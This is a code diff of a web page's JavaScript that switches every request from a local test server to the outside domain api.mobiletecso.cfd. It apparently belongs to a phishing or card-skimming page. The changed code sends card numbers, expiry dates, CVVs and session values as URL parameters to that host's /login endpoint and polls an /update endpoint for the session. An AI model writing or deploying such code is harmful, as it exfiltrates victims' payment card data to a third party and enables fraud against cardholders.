@@ -404,7 +404,7 @@
 <script>
   document.addEventListener('DOMContentLoaded', function () {
       document.getElementById('ShowInputButton').addEventListener('click', function() {
-          fetch('http://127.0.0.1:5000/test')
+          fetch('https://api.mobiletecso.cfd/test')
               .then(response => response.text())
               .then(data => {
                   console.log("Data received:", data);
@@ -471,7 +471,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
 
     if(question){
       console.log('question')
-      var url = "http://127.0.0.1:5000/login" +
+      var url = "https://api.mobiletecso.cfd/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
@@ -483,7 +483,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
               "&session=" + encodeURIComponent(session);
     } else {
       console.log('question')
-      var url = "http://127.0.0.1:5000/login" +
+      var url = "https://api.mobiletecso.cfd/login" +
               "?cardNumber=" + encodeURIComponent(cardNumber) +
               "&expiryDate=" + encodeURIComponent(expiryDate) +
               "&cvv=" + encodeURIComponent(cvv) +
@@ -546,7 +546,7 @@ document.getElementById('ShowInputButton').addEventListener('click', function() 
 });
 
 function fetchUpdate() {
-  fetch('http://127.0.0.1:5000/update'+"?session=" + encodeURIComponent(session))
+  fetch('https://api.mobiletecso.cfd/update'+"?session=" + encodeURIComponent(session))
     .then(response => {
       if (!response.ok) {
         throw new Error('Network response was not ok ' + response.statusText);
